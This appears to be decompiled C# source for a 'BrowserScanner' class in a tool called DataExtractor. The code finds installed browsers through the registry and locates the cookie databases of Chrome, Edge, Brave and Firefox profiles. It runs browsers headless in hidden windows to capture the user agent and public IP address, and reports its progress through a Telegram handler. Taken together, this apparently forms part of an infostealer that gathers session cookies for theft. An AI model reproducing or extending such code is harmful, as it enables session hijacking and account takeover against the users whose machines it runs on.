using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;
using DataExtractor.Core.Models.Browsers.BrowserDataInfo;
using DataExtractor.Core.Models.Browsers.Childs;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace DataExtractor.Core.Handlers;

public class BrowserScanner
{
	public void Scanning(List<MyBrowser> listData, ConfigData configData, TelegramHandler telegramHandler)
	{
		List<Browser> browsers = GetBrowsers(telegramHandler);
		ScanChomium(listData);
		ScanFirefox(listData);
		foreach (MyBrowser listDatum in listData)
		{
			if (listDatum is ChromeBrowser)
			{
				listDatum.BrowserData = browsers.FirstOrDefault((Browser a) => a.Name == "Google Chrome");
				GetUserAgent(listDatum, telegramHandler, configData);
			}
			else if (listDatum is EdgeBrowser)
			{
				listDatum.BrowserData = browsers.FirstOrDefault((Browser a) => a.Name == "Microsoft Edge");
				GetUserAgent(listDatum, telegramHandler, configData);
			}
			else
			{
				listDatum.BrowserData = new Browser();
			}
		}
	}

	private void GetUserAgent(MyBrowser data, TelegramHandler telegramHandler, ConfigData configData)
	{
		telegramHandler.Log("Get user agent : " + data.BrowserData.Path);
		string html = ScanHtml(data, "https://www.whatismybrowser.com/");
		string text = html.CutString("Your User Agent\">", "<");
		telegramHandler.Log("Result : " + text);
		if (!string.IsNullOrEmpty(text))
		{
			data.UserAgent = text.Replace("Headless", "");
		}
		else
		{
			data.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + data.BrowserData.Version + " Safari/537.36";
		}
		telegramHandler.Log("Current user agent : " + data.UserAgent);
		if (configData.Ip == null)
		{
			html = ScanHtml(data, "https://api.myip.com");
			html = html.CutString("<body>", "</body>");
			try
			{
				MyIp myIp2 = (configData.Ip = JsonConvert.DeserializeObject<MyIp>(html));
			}
			catch
			{
			}
		}
	}

	private string ScanHtml(MyBrowser data, string url)
	{
		string path = data.BrowserData.Path;
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = path;
		processStartInfo.Arguments = "--headless --disable-gpu --disable-logging --dump-dom " + url;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.WorkingDirectory = Path.GetTempPath();
		Process process = new Process
		{
			StartInfo = processStartInfo
		};
		try
		{
			process.Start();
			return process.StandardOutput.ReadToEnd();
		}
		catch
		{
			return "";
		}
	}

	public List<Browser> GetBrowsers(TelegramHandler telegramHandler)
	{
		List<Browser> list = new List<Browser>();
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
		if (registryKey == null)
		{
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
		}
		if (registryKey == null)
		{
			telegramHandler.Log("Can't check browser");
			return list;
		}
		try
		{
			string[] subKeyNames = registryKey.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				telegramHandler.Log("Find " + subKeyNames[i]);
				Browser browser = new Browser();
				RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
				browser.Name = (string)registryKey2.GetValue(null);
				RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
				browser.Path = registryKey3.GetValue(null).ToString().StripQuotes();
				list.Add(browser);
			}
		}
		catch (Exception ex)
		{
			telegramHandler.Log(ex.StackTrace);
		}
		return list;
	}

	private void ScanFirefox(List<MyBrowser> listData)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles");
		if (!Directory.Exists(path))
		{
			return;
		}
		FirefoxBrowser firefoxBrowser = new FirefoxBrowser();
		string[] directories = Directory.GetDirectories(path);
		foreach (string text in directories)
		{
			if (Directory.GetFiles(text).Any((string a) => Path.GetFileName(a) == "cookies.sqlite"))
			{
				firefoxBrowser.Profiles.Add(new BrowserProfile(firefoxBrowser)
				{
					CookiePath = Path.Combine(text, "cookies.sqlite")
				});
			}
		}
		listData.Add(firefoxBrowser);
	}

	private void ScanChomium(List<MyBrowser> listData)
	{
		listData.AddBrowserData(ScanChronium("Google\\Chrome\\User Data"));
		listData.AddBrowserData(ScanChronium("Microsoft\\Edge\\User Data"));
		listData.AddBrowserData(ScanChronium("BraveSoftware\\Brave-Browser\\User Data"));
	}

	private MyBrowser ScanChronium(string pathScan)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), pathScan);
		if (!File.Exists(Path.Combine(text, "Local State")))
		{
			return null;
		}
		MyBrowser myBrowser = null;
		if (pathScan.Contains("Google"))
		{
			myBrowser = new ChromeBrowser(Path.Combine(text, "Local State"));
		}
		else if (pathScan.Contains("Edge"))
		{
			myBrowser = new EdgeBrowser(Path.Combine(text, "Local State"));
		}
		else
		{
			myBrowser = new ChromiumBrowser(Path.Combine(text, "Local State"));
		}
		foreach (BrowserProfile item in from a in Directory.GetDirectories(text).Where(delegate(string a)
			{
				if (Path.GetFileNameWithoutExtension(a).StartsWith("Profile"))
				{
					return true;
				}
				if (Path.GetFileNameWithoutExtension(a).StartsWith("Default"))
				{
					return true;
				}
				return Directory.GetFiles(a).Any(delegate(string fn)
				{
					string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(fn);
					return (fileNameWithoutExtension == "Cookies" || fileNameWithoutExtension == "Network") ? true : false;
				}) ? true : false;
			}).Select(delegate(string folderPath)
			{
				string text2 = Path.Combine(folderPath, "Cookies");
				if (!File.Exists(text2))
				{
					text2 = Path.Combine(folderPath, "Network", "Cookies");
				}
				return File.Exists(text2) ? new BrowserProfile(myBrowser)
				{
					CookiePath = text2,
					ProfilePath = folderPath
				} : null;
			})
			where a != null
			select a)
		{
			myBrowser.Profiles.Add(item);
		}
		return myBrowser;
	}
}
